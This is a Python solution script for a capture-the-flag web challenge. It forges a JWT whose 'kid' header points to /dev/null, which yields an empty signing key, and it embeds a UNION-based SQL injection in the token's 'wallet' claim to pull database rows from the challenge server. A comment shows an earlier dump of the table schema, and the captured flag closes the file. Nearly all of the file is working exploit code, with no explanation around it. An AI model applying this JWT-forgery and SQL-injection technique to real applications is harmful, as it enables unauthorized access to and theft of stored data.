import jwt
import requests
import json

FILENAME = "/dev/null"
key = open(FILENAME).read(32)

# sql = "select sql,2 from sqlite_master"
"""
0 CREATE TABLE galette(id integer primary key autoincrement, name text, description text)
1 CREATE TABLE precommande(id integer primary key autoincrement, id_galette integer, personal_message text)
2 CREATE TABLE sqlite_sequence(name,seq)
3 CREATE TABLE users(id integer primary key autoincrement, username text, password text)
"""

sql = "select personal_message,2 from precommande"

cookies = {"user":jwt.encode({"username":"Monsieur Rennes Whisky","wallet":[f"2 union {sql}"],"kid":FILENAME}, key=key, algorithm="HS256")}
r = requests.get("https://la-galette-a-tout-prix.ctf.bzh:21000/wallet", cookies=cookies, verify=False)
for k,val in enumerate(json.loads(r.text)):
    print(k, val["name"])

# BZHCTF{u_st34l_th1s_b34ut1ful_g4l3tt3_s4uc1ss3!!}
